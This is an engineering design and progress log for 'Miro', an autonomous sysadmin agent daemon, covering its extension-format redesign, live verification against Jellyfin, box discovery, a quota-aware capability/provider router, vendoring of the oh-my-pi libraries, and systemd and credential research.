Slice 1 (Jellyfin fresh install through the whole Goal→Inspect→Infer→Ask-intent→Architect→Execute→
Verify→Retain loop, live-verified) is met. Residuals: `snapshots/` dir at default perms could hold
sensitive file contents (low-severity remainder of H2); the `esc interrupt` hint still has no
`ClientMessage` behind it; maturity-gated auto-approve still unwired.

### 5.13 Self-extension redesign - declarative-first, machine-earned knowledge (2026-09-02)

**Why.** Self-extension promoted exactly once across ~10 live runs; every failure lived in
generated-code validation (schema arity, import scan, JSON shape, await-bind). Root cause: the learn
agent hand-writes four TypeScript files, and *reads/diagnostics are imperative code* while *writes are
already declarative data* (`OperationBinding`). Second problem: the loop only worked because a
hand-written `golden-hints/<app>.json` spoon-fed the API sequence - which contradicts the whole thesis
("Miro learns whatever system is required"). If a human writes the map, it is not learning.

**Grilled decisions (2026-09-02, user).**
1. **Declarative default, generated-code escape hatch** - routine HTTP/API/config bindings become
   data Miro owns and validates as *schema*, not code that must compile. Self-writing code stays
   first-class (reserved for entries that genuinely need logic: pagination, multi-step auth,
   transforms), NOT a deprecated fallback.
2. **One `.ts` file per extension** (`extension.ts`) replacing tools/diagnostics/operations/browser -
   a module that is mostly data literals, functions only on the entries that need them.
3. **Machine-earned knowledge over golden hints** - introspect the running box first (the tools and a
   DISCOVERY-LADDER prompt already exist), capture real request/response traces, distill a persistent
   recipe (`server_facts` + `app_recipes` with a freshness/app-version tag). A captured trace and a
   declarative read entry are the *same shape*, so synthesis becomes mechanical.
4. **Provider-agnostic + compiler-as-teacher** - do not bet on Codex/Ollama (routing is already
   generic via `pickDefaultModel`/`resolveApiKey`/`PROVIDER_CATALOG`; the Codex "always-prefer" branch
   and Ollama special-case become a setting). The real fragility lever is validator feedback good
   enough that a *weak* model converges: every failure string names the fix.
5. **Tests from traces, not from the model** - `tests.ts` was killed this session precisely because
   model-authored tests were a second failure surface. Reborn as: the captured trace IS the test and
   the canary (promote only if replaying it still matches). One artifact does discovery, testing, and
   canary.

**Arc (slices):** 1 - single-file declarative format + declarative read binding + teacher-grade
validator feedback (foundation; keeps the Jellyfin golden hint in place to isolate the format change).
2 - discovery-first + trace capture + persistent `server_facts`/`app_recipes` + remove golden hints.
3 - trace-as-canary promotion + repair-on-drift + provider genericization.

**Slice 1 (this build).** New SDK vocabulary in `@miro/sdk`: `ReadBinding` (mirror of
`HttpMutationBinding` minus method/body, plus `pick`), `ExtensionEntry` (one of `read` data / `bind`
fn / `code` fn), `ExtensionModule` (`{ auth?, entries }`). The host (`host-entry.ts`) loads the one
file and *interprets* declarative reads (GET + path-template + `pick`) - zero generated code runs for
the common case; `bind` writes and `code` reads keep today's paths. `parameters` auto-derives from
`{placeholders}` in a read path (killing hand-typed schemas too). `validate.ts` typechecks/import-scans
the single file and wraps every failure string through a teacher mapper that appends the concrete fix.
Dead `tests.ts`/`browser.ts` machinery removed. Metadata (displayName/baseUrl/secretNames) stays as
`extension_write` params (the daemon needs baseUrl+secrets to init the host before any module loads).
Manifest still mechanically derived from the live host's `list_tools` - no hand-typed schemas.
Local verification (done, 2026-09-02): all four packages `tsc --noEmit` clean; `bun test` 256 pass /
14 skip / 0 fail (added `declarative.test.ts` for the interpreter + derived-schema, an
`annotateFailures` teacher-mapper test, and the single-file `reference.test.ts`). Crucially, a
scratchpad host smoke (`host-smoke.ts`) spawned the REAL extension-host subprocess against a real
`Bun.serve` fake app and a real generated `extension.ts`: `list_tools` derived all four specs and
auto-derived `get_widget`'s `{id}` schema; declarative reads ran with zero generated code (`pick`
dropped a field, `{id}` templated); the `code` diagnostic ran; the write bound to `http_mutation`;
and module auth was enforced (a wrong secret surfaced the 401). This is the exact
spawn→RPC→importGenerated→runRead path where prior live bugs hid, now green off-VM.
Live verification (done, dev VM, 2026-09-02) - MET, better than the bar:
- **Re-learn Jellyfin** (capability wiped, secrets kept, golden hint present): Codex generated ONE
  `extension.ts` and `extension_write` succeeded on **attempt 1** (vs. the historical ~10-run
  failure) - v1 promoted, 3 declarative reads (2 with `pick`) + 1 `code` health diagnostic + 2
  declarative write bindings. The model used the escape hatch exactly where intended (the health
  check that returns a boolean instead of throwing) and mapped auth to the on-file secret
  (`X-Emby-Token`/`session_token`). 4 of 6 entries are pure data - the compile/arity/import bug
  classes cannot exist on them.
- **Interpreter correct against real Jellyfin**: the declarative `list_media_libraries` read returned
  `[{Name:"TV Shows",Locations:["/media/TV"],...},{Name:"Movies",...}]`, cross-checked independently
  against `/System/Info/Public` (unauthed curl, v10.11.11) AND the container's own on-disk library
  config (`/config/root/default/` → Movies, TV Shows) - matching, with no generated code run for
  reads. (Secrets are encrypted at rest - `ref`+`ciphertext` only - so the authed endpoint could not
  be raw-curled, which is correct.)
- **Retained capability** (separate later turn, "is jellyfin healthy and which libraries?"): answered
  in 6s from the promoted v1 tools with **zero re-learn** and no thrash.

Two real bugs found live and fixed (the live-verification thesis earning its keep - neither caught by
tsc or unit tests):
- **Old-format migration**: pre-existing extensions (gotify, in the old 4-file format) are unloadable
  by the new host → every call fails → the repair loop auto-migrates them (it did, gotify→v12) but
  slowly, and the agent thrashed ~12min on a stale one. Fix (`agent/extension-tools.ts`): don't wire
  an extension whose dir lacks `extension.ts`; the capability reappears cleanly via `app_learn` on
  next use. New installs never hit this.
- **Cold-host init race** (latent, pre-existing, exposed by the run): `host.ts` `getSession` returned
  an existing-but-still-initializing session without awaiting readiness, so a SECOND parallel call
  reached `host-entry` before `loadExtension` set `loaded` → "Unknown tool". The agent's parallel
  `health`+`list_media_libraries` calls on a cold host hit it. Fix: `await waitReady(existing)` on the
  reused-session path (free once warm). Proven by a scratchpad host smoke (real subprocess + fake
  app): 9/9 checks pass with the fix, the parallel check rejects without it; and the VM re-run then
  showed both parallel calls succeeding, 0 "Unknown tool".

Local: 4 packages `tsc --noEmit` clean; `bun test` 256 pass / 14 skip / 0 fail (new
`declarative.test.ts` interpreter+schema tests, `annotateFailures` teacher-mapper test, single-file
`reference.test.ts`). Slice 1 met; unblocks Slice 2 (discovery + persistent knowledge).

**Slice 2, first cut - discovery replaces the golden hint (2026-09-03).** Grilled direction: wedge =
unattended persistent autonomy (the pitch), operation-engine safety (the enabler); build on a feature
branch with frequent commits + a PR to merge; a parallel subagent track drafts positioning/TUI. Scope
chosen: A (discovery + persistence) + D (provider genericize, folded in later) + context self-assembly
- "learn-your-server"; Stage D real-apps comes after. **Reframe found by reading the code first (it
changed the slice):** the substrate the plan assumed we would build already exists - `memory/store.ts`
already has both a `server_fact` and a `capability` (app-recipe) category with reinforcement + a
redaction choke point, and `agent/context.ts` is already self-assembling (per-turn live snapshot +
operated-systems summary + refusals, bounded, + a `capabilities` depth tool, wired at `index.ts`'s
`buildContextBlock(db, await takeSnapshot())`). So Q3's "context self-assembly" is largely built
already. The genuine gaps were narrower: (1) the live snapshot is ephemeral - never persisted; (2) the
learn agent was blind to the box, fed a hand-written `golden-hints/<app>.json` instead of live
inventory. This cut closes both (user chose "both in this slice"):
- **`src/discovery.ts`** (new): pure `hostPorts` / `presenceFrom` / `factsFrom` + thin
  `discoverAppOnBox` / `runDiscovery` wrappers over the existing inventory tools (containers, systemd),
  writing only through `memory/store`'s `remember`. Split pure-vs-shell like `parseDockerPs` /
  `listContainers`, so it is unit-tested with no mocks (`discovery.test.ts`, 8 tests).
- **Persist (commit `c7f5dc1`):** `runDiscovery(db)` runs at boot and on the 24h interval, persisting a
  bounded, deduped set of `server_fact`s (container roster + notable active services), reinforced each
  sweep, surfaced into every turn by `buildSummary`. Deliberately high-level - raw per-container detail
  already reaches the agent via the live snapshot, so this is the durable, cross-restart summary, not a
  copy. `ponytail:` no staleness prune yet (a removed container's fact lingers until re-derived).
- **Kill the golden hint (this commit):** `runLearnFlow` now derives the app's presence from the live
  box (`discoverAppOnBox` → container/image/service + published port → likely baseUrl) and hands THAT
  to the learning agent as its starting context, in place of `golden-hints/<app>.json`. Deleted
  `golden-hints.ts`, `golden-hints.test.ts`, `golden-hints/jellyfin.json`. The learn agent's own system
  prompt already has the discovery ladder (rung 1 = `container_list`/`container_inspect`), so it takes
  over from the discovered baseUrl; docs/probe research fill in auth + endpoints. AGENTS.md updated
  (also fixed a Slice-1 leftover there: the Extensions bullet still described the old five-file format).
- **The bar this raises:** deleting `jellyfin.json` also deletes a hard-won, live-verified auth-flow
  blob (the `/Startup/User` 404-priming quirk, the `MediaBrowser` client header). The cold-learn proof
  - learn Jellyfin with the hint gone, using only what the box reveals + the agent's research - is a
  real test of whether discovery + the ladder suffice on the hardest case; a successful run retains the
  flow via the existing `capability_write` (learned-once, not hand-authored). Needs `BRAVE_API_KEY` in
  the daemon env or `web_search` probes blind.
- Local: `apps/mirod` `tsc --noEmit` clean; `discovery.test.ts` 8/8; full suite 258 pass / 0 fail.
- **Live verification (dev VM, 2026-09-03) - the discovery mechanism is MET.** An independent script
  ran `discoverAppOnBox`/`runDiscovery` against the VM's REAL docker: it found the real `jellyfin`
  container (`jellyfin/jellyfin:latest`, running), parsed host port 8096 from live `docker ps`, and
  derived `http://localhost:8096` - the exact context now fed to the learn goal in place of the golden
  hint; `sonarr` (absent) returned `found:false` (the honest fallback). `runDiscovery` persisted 2
  server_facts, reinforced not duplicated on a second sweep. The live root daemon, restarted with this
  code, logged `[mirod] discovery: 2 server fact(s) refreshed` at boot, and an independent
  `bun:sqlite` read (as root) of the real on-disk `/var/lib/miro/miro.db` showed
  `server.containers`/`server.services` rows with source `discovery` - so they reach every turn via
  `buildSummary`.
- **Not run - the full autonomous Jellyfin cold-learn (stretch bar):** blocked by no `BRAVE_API_KEY`
  in the VM daemon env (`web_search` probes blind - a known env gotcha, not a code issue), and it
  would need the existing jellyfin capability/extension wiped first; it tests the learn agent's
  blind-probing more than the discovery change this slice makes. Deferred until a Brave key is around.
- Follow-up noted (not this slice): `NOISE_UNIT` (shared with the live snapshot in `agent/context.ts`)
  lets a few low-value units through (`kmod-static-nodes`, `user-runtime-dir@`, `upower`); tighten it
  in a later pass if the persisted `server.services` fact reads noisy.

### 5.14 Capability & Provider Architecture - generic, routed, quota-aware (2026-09-03)

Direction (user, deliberated - supersedes the "just swap the search backend" framing): **web search is only the FIRST use case of a generic capability architecture.** The agent sees canonical capabilities; the runtime routes each to one or more provider implementations, preferring provider-native where practical and **never reducing to the lowest common denominator**. We are willing to fork pi/pi-ai deeply so hosted tools become first-class capabilities rather than "impossible". Extensions add new capabilities AND new implementations of existing ones with no core change. Linux/Debian/systemd is the target; credentials live in the encrypted SecretStore with native OAuth/device/browser login, not env vars. This section is the implementation-ready architecture; the "do not ask more" instruction means open details below are resolved by reasonable default, called out where chosen.

**Why now.** Killing the Brave dependency surfaced (verified against `@earendil-works/pi-ai` 0.84.4) that pi-ai cannot enable provider-hosted tools: `Tool` is client-executed function tools only - no hosted-tool variant, response content can't represent server-tool results/citations, and every adapter emits `function`/`functionDeclarations`. So "use the provider's built-in search" is achievable today ONLY for a provider exposing a standalone HTTP search API (Ollama Cloud's `/api/web_search`); OpenAI/Anthropic/Gemini hosted search needs a pi-ai fork. Rather than special-case search, generalize into a capability layer that a fork slots into later.

**Core concepts.**
- **Capability** - a canonical operation with a typed, normalized request/response, identified by a dotted id (`web.search`, `web.fetch`, later `llm.chat`, …). The AGENT-facing tool name is the underscore form (`web_search`); the capability-id → tool-name mapping MUST satisfy `^[a-zA-Z0-9_-]+$` (the Codex/Responses constraint that is already load-bearing project-wide - dotted ids stay internal to the registry, never sent to a provider as a tool name).
- **Implementation** - a concrete fulfilment of a capability by a provider: `web.search` has impls `ollama` (HTTP), `searxng.selfhosted`, `searxng.public`, later `openai.hosted` (needs the fork), optional `tavily`. Each declares metadata: features, cost model, auth requirement, runtime characteristics (latency/reliability), and live health.
- **Provider** - the upstream account/service an impl uses (ollama-cloud, a searxng node, openai, …), carrying credentials (SecretStore) + quota state.
- **Registry** - capabilities + impls registered at boot; **extensions register new capabilities or new impls for existing capabilities via the SDK**, validated/sandboxed exactly like today's extensions, with no core change.

**Router.** Per-capability default policy, overridable **per request**. Modes: `fixed(provider)`, `auto` (best healthy by score), `ordered-fallback([...])` (next on failure), `parallel-fanout([...])` (N concurrent → first-good or merge). Inputs: capability + request + policy + provider metadata + health + the quota subsystem. Per-impl timeouts; graceful partial failure. `web.search` default policy: ordered [`ollama` (if keyed), `searxng.selfhosted` (if configured/discovered)] then `parallel-fanout(public pool)`, health-tracked.

**Result handling (list-returning capabilities).** Normalize to the canonical shape (`WebSearchResult` today), **preserve provenance** (which source produced each result), dedup by normalized URL, rank/rerank on merge. Provenance is kept for transparency, debugging, and health scoring.

**Usage / quota / rate-limit subsystem (centralized).** A `bun:sqlite` store (the `operations/store.ts` shape) tracks per provider: requests, tokens, monetary cost, in-flight concurrency, free-tier limits, reset times, 429 events, remaining quota - each value tagged **known | estimated | unknown**. Fed by response headers (`ratelimit-remaining`/`reset`), provider APIs, our own counting (estimated), and config (free-tier limits). The router reads it to **avoid exhausted/unhealthy providers automatically** (a 429 → cool that provider until its reset) and enforces per-provider concurrency caps. The known/estimated/unknown tag keeps the router honest about what it actually knows vs guesses.

**Provider/capability metadata (dynamic).** Each impl exposes its supported capabilities, feature flags, cost model, auth type, and live health/latency/quota - queryable, feeding the router, the `capabilities` tool, and context assembly.

**Extensibility & provider-specific features.** The SDK gains a `capabilityImplementation` declaration: bind an existing capability id to a new provider, or declare a new capability - validated like existing extensions. Preserve provider-specific extras rather than flattening to the LCD: an impl may surface extra fields that provenance-aware consumers use.

**pi/pi-ai fork (hosted tools) - a later phase, designed-for now.** To make OpenAI/Anthropic hosted tools first-class: fork pi-ai to add a hosted-tool variant to `Tool` (discriminated: client-executed | provider-hosted), response content types for server-tool results/citations, and per-adapter emission. The capability layer is built so a hosted impl slots in (it declares "runs server-side, no client `execute`"); until the fork lands, `web.search` uses client impls only.

**Ollama split.** (a) Ollama **Cloud account** features - `web_search`/`web_fetch` - used directly over HTTPS with an account key in the SecretStore (NOT env-primary); no CLI, no local runtime. These are `web.search`/`web.fetch` impls. (b) Local Ollama **inference** - only when the user installs the runtime; Miro detects it (`registerOllamaIfReachable` exists), offers install as a confirmed operation, manages lifecycle. Cloud search works without local inference; the two are independent and separately gated.

**Credentials / auth (Linux-native).** Primary store = the encrypted SecretStore; env vars = fallback only. Native OAuth/device-code/browser login where the provider supports it (Codex OAuth is the precedent; extend with device-code flows and browser flows via the extension host's Chromium). Ollama = an account key minted by login to ollama.com, stored `provider.ollama` / `oauth.ollama`.

**Platform.** Bun daemon, Debian-first, systemd unit, state in `/var/lib/miro`, per-provider concurrency, SecretStore creds - all designed around Linux; the dev Mac is dev-only.

**Implementation sequence** (sliced for live-verification - the house style requires clean checkpoints even though the ask was "one slice"; each slice = branch + PR + extensive unit tests + a VM live-verify, per the user's "YOU doing extensive testing"):
1. **Capability registry + router + `web.search`** with client impls (`ollama` cloud search, `searxng.selfhosted` if configured/discovered, `searxng.public` parallel pool + health), normalization/provenance/dedup, per-impl timeouts, minimal health scoring. Ollama key in the SecretStore. **Kills Brave.** Extensive unit tests + a VM live run against real public nodes and a self-hosted node.
2. **Usage/quota/rate-limit subsystem** + router integration (avoid-exhausted, 429 cooldown, concurrency caps); `web.fetch` capability; **self-hosted SearXNG setup** as a confirmed docker operation (ask-first) with JSON output enabled.
3. **Extension-defined capability impls** (SDK `capabilityImplementation` + validation) + dynamic provider metadata surfaced into context and the `capabilities` tool.
4. **pi/pi-ai fork for hosted tools** → OpenAI/Anthropic native `web.search` as first-class impls; native OAuth/device login for providers; local Ollama runtime install UX.

**Open details resolved by reasonable default:** capability ids dotted internally, tools underscored; `web.search` default policy = ordered-then-parallel as above; health score = rolling success-rate × recency, decayed, with a cooldown on repeated failure/429; public-node list = live `searx.space` filtered to JSON-capable + healthy, cached, plus a small bundled fallback; dedup key = normalized URL (scheme/host/path, tracking params dropped); rerank in slice 1 = provenance-weighted score-merge (a real reranker deferred); per-impl timeout default ~8s, total `web.search` budget ~12s; public-pool fan-out default = 3 nodes, first-good wins.

**Finalized by grilling (2026-09-03) - these REVISE the defaults above.**

- **Fork pi/pi-ai EARLY, as slice 0** (not the deferred phase-4 above). We MOVE the upstream TypeScript source into the Miro monorepo (`packages/pi-ai`, `packages/pi-agent-core`, imported like `@miro/*`), own it outright, deviate freely, and **cherry-pick** upstream selectively - no continuous rebase. pi is MIT and its full TS is recoverable (sourcemaps embed `sourcesContent`) or cloned from `github.com/earendil-works/pi` (`packages/ai`, `packages/agent-core`). Fork cost (verified): **medium, mechanically easy** - ~1 core type edit + 3 adapter edits (emit+parse) in pi-ai, ~2 in pi-agent-core; riskiest parts are upstream churn (mitigated by owning+trimming) and multi-turn citation round-tripping.
- **Hosted-tool support is the point of the fork.** Add a hosted-tool variant to `Tool` (discriminated: client-executed | provider-hosted), assistant-message content types for server-tool results + citations, and per-adapter emit+parse for OpenAI Responses `web_search`, Anthropic `web_search_20250305`, Google `googleSearch` grounding. In `pi-agent-core`: allow registering a no-`execute` (hosted) tool and render the new content type. This makes provider-native `web.search` a first-class capability impl available from slice 1. (These providers expose search ONLY as an in-turn hosted tool - no standalone REST - so the fork is the only path to native/grounded search; client impls below cover everything else.)
- **Trim the provider roster.** pi ships ~35 adapters. CUT the regional/plan junk: `xiaomi*` (all), `qwen-token-plan-cn`/`-individual`, `moonshotai-cn`, `minimax-cn`, `zai-coding-cn`, `ant-ling`, `kimi-coding`, `opencode(-go)`, `radius`, `baseten`. KEEP mainstream: anthropic, openai (responses/completions/codex), google (+vertex), azure, openrouter, mistral, deepseek, groq, cerebras, together, fireworks, nvidia, xai, huggingface, cloudflare-workers-ai, bedrock, github-copilot, vercel-ai-gateway, moonshot, minimax, zai, qwen(base), pi-messages, faux(test).
- **Add free providers** (so Miro runs at $0 out of the box): `llm7.io` - anonymous, NO key/account (OpenAI-compatible; ~10 RPM / 500k tok/day anon, a free token raises it) - the zero-setup default; surface OpenRouter `:free` models; Groq + Google AI Studio (Gemini) free tiers; and Cloudflare Workers AI / Mistral / SambaNova / Cohere / NVIDIA NIM as available. The router's free-tier pool + quota subsystem pick among them.
- **Ollama credentials = paste-a-key, not OAuth.** Research confirmed there is NO OAuth/device flow to MINT an Ollama cloud key - keys are created at `ollama.com/settings/keys` (free account); `ollama signin` is public-key device registration for the LOCAL runtime/models, unrelated to the cloud key. So Miro prompts for / stores a pasted key in the SecretStore (the extension-host browser may open the keys page to assist). Native OAuth/device login stays the direction for providers that actually support it (Codex already does). Ollama cloud search API: `POST https://ollama.com/api/web_search`, `Authorization: Bearer`, body `{query, max_results≤10}` → `{results:[{title,url,content}]}`; `POST /api/web_fetch` → `{title, content, links}`.
- **Revised implementation sequence:** **Slice 0** - vendor pi + pi-agent-core into the monorepo, trim the junk providers, add the free providers, add hosted-tool support; keep the existing daemon green on the vendored fork. **Slice 1** - capability registry + router + `web.search` (client impls: Ollama HTTP, SearXNG self-hosted/public pool; native impls: OpenAI/Anthropic/Google hosted search via the fork) + the quota/rate-limit subsystem. **Slice 2** - `web.fetch` + self-hosted SearXNG as a confirmed docker operation (ask-first, JSON enabled). **Slice 3** - extension-defined capability impls + dynamic provider metadata into context/`capabilities`. Each slice = branch + PR + extensive unit tests + a VM live-verify (the user's "YOU do extensive testing").

**Revised by the oh-my-pi review (2026-09-03) - SUPERSEDES the "fork vanilla pi" slice 0 above.**

- **omp** (`github.com/can1357/oh-my-pi`, MIT, Bun+TS+Rust, 5.5k★/177 contributors) is a mature pi fork whose libraries already do what slice 0/1 planned. Verified by cloning: `@oh-my-pi/pi-ai` (npm 18.1.6, ships raw TS, no build) already has **provider-hosted tools** (Anthropic `web_search`/`code_execution`/`text_editor`/`computer` via `ANTHROPIC_BUILTIN_TOOL_NAMES`; OpenAI Responses `web_search_call`) and a **reusable credential-rotation/backoff/quota layer** (`AuthStorage` round-robin/usage-limits/OAuth-refresh, `auth-retry` account-switching, multi-process `auth-broker`, `sqlite-credential-store`); `pi-catalog` = model catalog/resolution; `pi-agent-core` = the Agent/AgentTool loop. All standalone (no CLI/LSP/DAP/puppeteer).
- **Decision: vendor omp's `pi-ai` + `pi-catalog` + `pi-agent-core` (+ deps `omptype`/`utils`/`wire`/`natives`/`snapcompact`) into the monorepo** instead of forking vanilla pi. Own them, trim the junk providers, add the free providers, cherry-pick omp upstream. This **deletes** the planned hosted-tools fork and most of the quota-subsystem build.
- **Posture: Miro is the product; omp is a parts bin.** Take bits and pieces, merge or fork+strip to Miro's needs - never wholesale. KEEP Miro's Memory+Dreaming and its classify→sandbox→operation-engine safety model: no raw embedded-bash (`brush-core`) or `eval` worker paths; any adopted exec power routes through the engine.
- **Adopt from omp beyond providers:** `hashline` (content-hash-anchored edits, −61% tokens, no str-replace loops → reliable server config edits), `pi-iso` isolation primitives (overlayfs/reflink/clone → harden the sandbox, isolated dry-runs), browser + computer control (learn-agent browser upgrade; GUI-only appliances). Preview-then-accept + advisor model: consider later. Memory: keep Miro's, cherry-pick omp techniques (compression, reflect/learn prompts).
- **Schemas: keep TypeBox.** omp's pi-ai re-exports `omptype` (ArkType), but `Tool.parameters` accepts raw JSON Schema (`TSchema = Type | TJsonSchema`) and TypeBox's `Type.Object({...})` IS a JSON Schema object at runtime. So import `Type` from TypeBox directly (not pi-ai) and pass the result - near-zero tool churn; the `@miro/sdk` `Type` export and the learn-agent's generated-extension contract stay unchanged. **VERIFIED (2026-09-03) against real omp source:** `types.ts:1258` defines `TJsonSchema` with the comment "legacy TypeBox emits this shape", `TSchema = Type | TJsonSchema`; every adapter (Anthropic `input_schema`, OpenAI Responses/Completions `parameters`, Google) routes through one `toolWireSchema` (`utils/schema/wire.ts`) whose plain-JSON branch passes a TypeBox object through verbatim; argument validation uses omp's own `validateJsonSchemaValue` (the `kind:"json"` branch of `validateToolCall`), no omptype needed. Ran end-to-end: clean schema on the wire, correct accept/reject. No tweak required. Benign gotchas: TypeBox's enumerable `Symbol(TypeBox.Kind)` rides object-spread but never serializes (`JSON.stringify` drops symbols); `toolWireSchema` memo-stamps non-enumerable symbols onto the schema object in place; `additionalProperties:false` is not auto-added on this path (only on strict/ArkType paths) - matches TypeBox's open-by-default. Other migration touches: `builtinModels` → `pi-catalog` `getBundledModels`/`createModelManager`; `streamSimple`/`Agent`/`AgentTool`/`Model`/`AssistantMessage`/`Tool` are near drop-in.
- **`web.search`: build our own multi-source resolver** (SearXNG public pool + self-hosted + Ollama HTTP) on pi-ai; provider-native hosted search (Anthropic/OpenAI/Gemini) comes free via pi-ai. Lift omp's search-registry/fallback PATTERN (MIT) - its ~20 backends live in `packages/coding-agent/src/web/search/` welded to puppeteer/babel/tui, so we don't pull that package. Per-role routing: rebuild the thin role→model glue on `pi-catalog` (omp's `model-resolver.ts` is coding-agent app config).
- **Rust: allowed, single binary required.** `pi-natives` is pulled transitively (`pi-utils` file-lock/ptree/procmgr; agent-core's tokenizer) as a **prebuilt** N-API binary - no cargo on Debian glibc x64/arm64 or mac; musl/Alpine has no prebuilt (would need a build). Bun `--compile` embeds `.node` napi addons → the single binary is achievable. **scriptc** (Vercel TS→native, ~320KB binaries, zig cross-compile) evaluated: not viable for the daemon - no Bun APIs (`bun:sqlite`, `Bun.spawn`/`serve`/`listen`), no N-API loading, big deps rejected/Tier-2; consistent with the Stage-A finding. Bun `--compile` stays the path.
- **Revised sequence:** **Slice 0** = vendor the omp libs, trim junk providers, add free providers (llm7 no-key, OpenRouter `:free`, Groq, Gemini free, …), migrate Miro's imports (`builtinModels`→catalog, `Type` from TypeBox), prove the single-binary build embeds the addon, keep the daemon green. **Slice 1** = capability registry + router + `web.search` (own resolver; native + client impls) + a thin cost/free-tier/known-estimated-unknown layer on top of pi-ai's auth/quota. **Slice 2** = `web.fetch` + self-hosted SearXNG docker-op (ask-first) + `hashline` edits. **Slice 3** = extension-defined impls + `pi-iso` + browser/computer. Scope of the whole thing is being re-grilled (see below) before slice 0 starts.

**Identity ratified (2026-09-03, the user, verbatim) - resolves the scope grilling's central fork and SUPERSEDES any "specialized coding agent for servers" framing above:**

> Miro is not a coding agent specialized for servers. Miro is an autonomous, persistent system administrator. Code editing, configuration editing, shell execution, browser automation, API use, network inspection, reverse engineering, and extension authoring are merely tools available to it when administering a machine. Architect every capability around the sysadmin outcome loop: understand state → plan → act → observe → verify → repair/rollback → learn. Do not artificially constrain Miro to declarative infrastructure-as-code when a competent human sysadmin would use another mechanism.

What this settles:
- **The organizing principle is the loop, not the mechanism.** Every capability - existing or adopted from omp - is placed on a loop stage and gated by the loop's safety (plan/confirm → observe/verify → rollback/repair), never by banning a mechanism a competent sysadmin would use. The existing subsystems already map onto it: *understand* = inventory + discovery + context assembly + memory; *plan* = the operation plan + agent reasoning; *act* = the operation kinds (shell/file/http/service) + extension tools + browser; *observe* = captured state + re-inventory; *verify* = the operation verify step; *repair/rollback* = engine rollback + the Dreaming repair loop; *learn* = memory + `capability_write` + discovery persistence.
- **Mechanisms are unconstrained, loop-gated.** Code edits (hashline), config edits, shell, browser/computer control, APIs, `net_capture`/reverse-engineering, and extension authoring are all legitimate tools - each routed through the engine for confirm/verify/rollback. The "server infra-code only via hashline" and "config + own extensions only" framings are rejected as artificial ceilings.
- **§56 stands, read through this identity.** Its test - *does it materially make Miro better at quietly maintaining and operating a self-hosted server?* - is the gate. "Not a coding tool you sit at" is consistent: Miro is a sysadmin that codes when a sysadmin would, not a coding tool. A vendored client SDK (pi-ai) is a tool; the forbidden "custom model runtime" means an inference runtime, which we still do not build.
- **The declarative-first extension format (§5.13) is unaffected** - a codegen-reliability DEFAULT with a `code` escape hatch, not a mechanism ceiling.
- **Existing safety gates stay** (classifier, sandbox, trash-instead-of-`rm`): they are the loop's recoverability implementation, not mechanism bans. Any newly adopted mechanism gets the same gate rather than a carve-out.

### 5.15 Research pass - prior art & platform (2026-09-03)

User: "review notes that exist, do research on everything we've previously and now discussed." Four research tracks (A: autonomous-sysadmin prior art + the outcome loop; B: self-expanding capabilities + memory; C: providers/quota/free tiers/search/egress; D: distribution/systemd/credentials). Recorded here as each lands; findings are actionable inputs to slices 0–3, not decorations.

**D. Distribution, systemd, credentials - findings and decisions.**
- **Build = native-per-target, never cross-compile once native addons are in the graph.** `--target` cross-compiles the Bun *shell* but resolves `.node` prebuilts for the HOST platform/libc → an arm64 shell wrapping an x64 or wrong-libc blob that crashes at startup. CI matrix: `ubuntu-24.04` (x64) + `ubuntu-24.04-arm` (native arm64 runner - free for public repos, ~3× faster than QEMU, and no emulation risk for a JIT). Per job: `bun install --frozen-lockfile` with explicit `--os linux --cpu <arch>` (a libc mis-resolution - musl prebuilt on a glibc host - is silent at install and only fails at `require()`), then `bun build --compile --minify --sourcemap --bytecode` (bytecode = parse cost moved to build time; Bun's documented production recipe). Targets `bun-linux-x64`/`bun-linux-arm64` (glibc - matches napi-rs `-gnu` prebuilts and Iroh's glibc build). Ship a SHA256 manifest per artifact; `--compile` output is not byte-reproducible, so CI is the source of truth. macOS `codesign` is dev-only, N/A for Debian.
- **RISK to live-verify before trusting the single binary: `oven-sh/bun#26045`** - `--compile` with MULTIPLE native NAPI modules mixes up their exports. Miro will embed ≥2 (`pi-natives` + `@number0/iroh`). Verify both addons' exports in the *actual compiled binary* on the dev VM, on the pinned Bun version - not merely under `bun run`. Add a boot-time assertion that each addon initializes, so a bad resolution fails loudly at start rather than deep in a turn.
- **systemd unit:** run `systemd-analyze security mirod.service` and drive the score down. Baseline: `ProtectSystem=strict`, `ProtectHome=yes`, `PrivateTmp=yes`, `StateDirectory=miro`, `RuntimeDirectory=miro` + `RuntimeDirectoryMode=0750` (the socket), `UMask=0077`, `PrivateDevices`, `ProtectKernelTunables/Modules/Logs`, `ProtectControlGroups/Clock/Hostname`, `ProtectProc=invisible` + `ProcSubset=pid`, `NoNewPrivileges`, `LockPersonality`, `RestrictSUIDSGID`/`RestrictRealtime`/`RestrictNamespaces`, `RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6`, `SystemCallFilter=@system-service` + `SystemCallArchitectures=native`, `Restart=on-failure`, `WatchdogSec` with `sd_notify(WATCHDOG=1)`. **`MemoryDenyWriteExecute=yes` MUST be live-verified** - JavaScriptCore's JIT needs W^X memory; confirm mirod boots under it on the VM before it ships in the unit (exactly the class of runtime-only failure the live-verification doctrine exists for). Socket: `RuntimeDirectory` + the daemon `chmod`s it, or `.socket` activation with `SocketMode=0660 SocketGroup=miro` - matches the root-daemon/group-socket design. Root only where genuinely needed; privilege-dropping subprocesses (the extension host's `setpriv` pattern) are exactly systemd's own recommendation. Log to stdout/stderr → journald; no hand-rolled log files.
- **Credentials: the existing encrypted-file + key-file `SecretStore` is the right headless/root pattern - confirmed, no change.** Kernel keyring (`keyctl`) is in-memory/session-scoped (dies on reboot; no login session backs a daemon); Secret Service/libsecret needs a D-Bus session + PAM-unlocked keyring that does not exist headless.
- **OAuth reality is narrower than "native login where possible":** RFC 8628 device-code exists for GitHub, and - only since ~March 2026 - OpenAI Codex (`codex login --device-auth`; pin a new-enough version; `earendil-works/pi#2635` is an open request for the same in pi). **Anthropic has NO device flow** (`anthropics/claude-code#22992`, open) - headless = API key or a once-minted long-lived token. **Google has no RFC-8628 flow** - `gcloud … --no-browser` or, recommended for unattended use, a service-account key. **Decision:** standardize provider auth on static credentials in the SecretStore (API keys, service-account JSON, once-minted long-lived tokens); device-code is an optional nicer onboarding only where a provider actually ships it (GitHub now, Codex when pinned). Do not build a generic device-code abstraction speculatively. Ollama's paste-a-key fits this consistently.
- **Self-update for a single-binary daemon:** download to a temp file on the same filesystem → verify signature/checksum → atomic `rename(2)` over the binary → `systemctl restart`; keep `mirod.prev` and let the watchdog/health check auto-revert on repeated failed starts. Nothing off-the-shelf fits (`systemd-sysupdate` is A/B-partition shaped) - small custom code.
